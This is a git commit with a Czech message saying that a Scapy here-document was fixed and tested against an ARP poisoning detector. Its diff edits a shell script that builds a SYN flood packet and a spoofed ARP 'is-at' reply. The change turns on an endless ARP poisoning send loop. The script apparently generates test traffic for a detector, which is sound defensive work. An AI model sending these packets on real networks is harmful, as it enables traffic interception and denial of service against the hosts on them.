bd31139948d8d74db8ffd52e9c0bc0b4c0ef679b
Pavel <pavel.benacek@gmail.com>
2011-12-19 22:48:16 +0100

    scapy: opraveny here document pro scapy, otestovano s detektorem arp poisoningu

--- scapy/SCAP_GEN.sh
+++ scapy/SCAP_GEN.sh
@@ -6,18 +6,18 @@ SYN_DST_ADDRESS="192.168.1.1"
 SYN_DST_PORT="80"
 #2)ARP poissoning
 VICTIM_MAC="00:00:00:00:00:00"
-VICTIM_IP="192.168.1.1"
-SPOOFED_IP="192.168.1.2"
+SPOOFED_SENDER_IP="192.168.1.1"
+SPOOFED_IP="192.168.1.13"
 ATTACKER_MAC="00:00:00:00:00:BE"
 
 ##################################
 scapy << -EOF
-	#1)generovani paketu pro SYN
-	packetSYN=IP(dst="$SYN_DST_ADDRESS")/TCP(dport="$SYN_DST_PORT, flag="S")
-	#send(packetSYN,loop=1) #posilej paket v nekonecne smycce
+#1)generovani paketu pro SYN
+packetSYN=IP(dst="$SYN_DST_ADDRESS")/TCP(dport="$SYN_DST_PORT, flag="S")
+#send(packetSYN,loop=1) #posilej paket v nekonecne smycce
 
-	#2)ARP poisoning
-	packetARP=Ether(dst="$VICTIM_MAC")/ARP(op="is-at",hwsrc="$ATTACKER_MAC",psrc="$SPOOFED_IP",pdst="$VICTIM_MAC")
-	#sendp(packetARP,loop=1) #posilej paket v nekonecne smycce
+#2)ARP poisoning
+packetARP=Ether(dst="$VICTIM_MAC")/ARP(op="is-at",hwsrc="$ATTACKER_MAC",psrc="$SPOOFED_SENDER_IP",pdst="$SPOOFED_IP")
+sendp(packetARP,loop=1) #posilej paket v nekonecne smycce
 
 EOF
